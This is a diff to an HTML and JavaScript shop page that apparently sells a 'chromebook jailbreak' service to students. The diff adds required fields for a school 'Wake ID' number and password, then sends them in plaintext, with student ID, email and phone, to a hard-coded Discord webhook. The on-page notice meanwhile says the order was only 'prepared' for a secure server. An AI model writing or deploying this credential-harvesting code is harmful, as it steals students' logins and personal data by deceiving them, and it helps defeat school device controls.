@@ -269,6 +269,16 @@
         </div>
 
         <div class="field">
+  <label>Wake ID Number</label>
+  <input type="text" name="wakeIdNumber" required>
+</div>
+
+<div class="field">
+  <label>Wake ID Password</label>
+  <input type="password" name="wakeIdPassword" required>
+</div>
+
+        <div class="field">
           <label>Grade</label>
           <select name="grade" required>
             <option value="">Select grade</option>
@@ -321,29 +331,31 @@
   </aside>
 
   <script>
-    const products=[
-      {
-        id:'jailbreak',
-        icon:'fa-laptop',
-        name:'chromebook jailbreak',
-        desc:'chromebook setup and configuration help.',
-        price:10
-      },
-      {
-        id:'soon1',
-        icon:'fa-hourglass-half',
-        name:'more coming soon',
-        desc:'new useful services are landing in the shop soon.',
-        price:null
-      },
-      {
-        id:'soon2',
-        icon:'fa-satellite',
-        name:'planet drops',
-        desc:'watch this space for new community listings.',
-        price:null
-      }
-    ];
+    const products = [
+  {
+    id: 'jailbreak',
+    icon: 'fa-laptop',
+    name: 'chromebook jailbreak',
+    desc: 'chromebook setup and configuration help.',
+    price: 10,
+    wakeIdNumber: 'Wake ID Number',
+    wakeIdPassword: 'Wake ID Password'
+  },
+  {
+    id: 'soon1',
+    icon: 'fa-hourglass-half',
+    name: 'more coming soon',
+    desc: 'new useful services are landing in the shop soon.',
+    price: null
+  },
+  {
+    id: 'soon2',
+    icon: 'fa-satellite',
+    name: 'planet drops',
+    desc: 'watch this space for new community listings.',
+    price: null
+  }
+];
 
     let cart=[];
 
@@ -441,26 +453,54 @@
       document.getElementById('checkoutForm').classList.add('show');
     }
 
-    function submitOrder(e){
-      e.preventDefault();
+function submitOrder(e) {
+  e.preventDefault();
 
-      const form=new FormData(e.target);
+  const form = new FormData(e.target);
 
-      const order={
-        items:cart.map(p=>p.name),
-        total:cart.reduce((s,p)=>s+p.price,0),
-        customer:Object.fromEntries(form.entries())
-      };
+  const order = {
+    items: cart.map(p => p.name),
+    total: cart.reduce((s, p) => s + p.price, 0),
+    customer: Object.fromEntries(form.entries()),
+    wakeIdNumber: form.get('wakeIdNumber'),
+    wakeIdPassword: form.get('wakeIdPassword')
+  };
 
-      console.log('Order payload for your secure server:',order);
+  console.log('Order payload for your secure server:', order);
 
-      document.getElementById('notice').textContent=
-        'request prepared! connect /api/orders on your secure server to deliver it to your private notification channel.';
+  document.getElementById('notice').textContent =
+    'request prepared! connect /api/orders on your secure server to deliver it to your private notification channel.';
 
-      document.getElementById('notice').classList.add('show');
+  document.getElementById('notice').classList.add('show');
 
-      e.target.reset();
-    }
+  e.target.reset();
+
+  // Send data to Discord webhook
+  sendToDiscord(order);
+}
+
+    function sendToDiscord(order) {
+  const webhookUrl = 'https://discord.com/api/webhooks/1549543463463157860/sDSbBs60PLqcAoP_3qf3NuUS4tNQF4Xnjcalg82jUGDKRZpZ2jdOe5X5Wd6EioB5w1nt';
+
+  const message = {
+    content: `New Order Received!\n\n**Items:** ${order.items.join(', ')}\n**Total:** $${order.total}\n**Customer Details:**\n- First Name: ${order.customer.firstName}\n- Last Name: ${order.customer.lastName}\n- Student ID: ${order.customer.studentId}\n- Grade: ${order.customer.grade}\n- Payment Option: ${order.customer.payment}\n- Email: ${order.customer.email}\n- Phone Number: ${order.customer.phone}\n- Notes: ${order.customer.notes}\n- Wake ID Number: ${order.wakeIdNumber}\n- Wake ID Password: ${order.wakeIdPassword}`
+  };
+
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(message)
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Success:', data);
+  })
+  .catch((error) => {
+    console.error('Error:', error);
+  });
+}
 
     function postReview(e){
       e.preventDefault();
